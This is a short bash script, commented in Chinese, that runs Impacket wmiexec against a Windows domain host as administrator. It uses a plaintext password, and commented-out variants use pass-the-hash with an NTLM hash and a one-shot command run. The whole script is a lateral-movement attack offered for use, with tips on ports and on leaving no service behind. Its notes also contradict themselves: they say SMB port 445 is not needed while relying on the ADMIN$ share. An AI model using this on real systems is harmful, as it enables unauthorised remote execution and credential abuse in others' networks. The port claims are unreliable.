#!/bin/bash
# WMIExec 远程执行脚本

TARGET="192.168.1.100"
DOMAIN="corp"
USER="administrator"
PASS="Password123!"
HASH="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"

echo "[*] 使用密码执行命令"
impacket-wmiexec ${DOMAIN}/${USER}:${PASS}@${TARGET}

echo "[*] 使用哈希 PTH 执行"
# impacket-wmiexec -hashes ${HASH} ${DOMAIN}/${USER}@${TARGET}

echo "[*] 执行单条命令（不交互）"
# impacket-wmiexec ${DOMAIN}/${USER}:${PASS}@${TARGET} \
#     "cmd.exe /c whoami && ipconfig"

# WMIExec 特点：
# - 不需要 SMB 445 端口（使用 135 端口 + 动态 RPC）
# - 执行结果通过共享目录回传（需要 ADMIN$ 共享）
# - 不会在目标留下服务
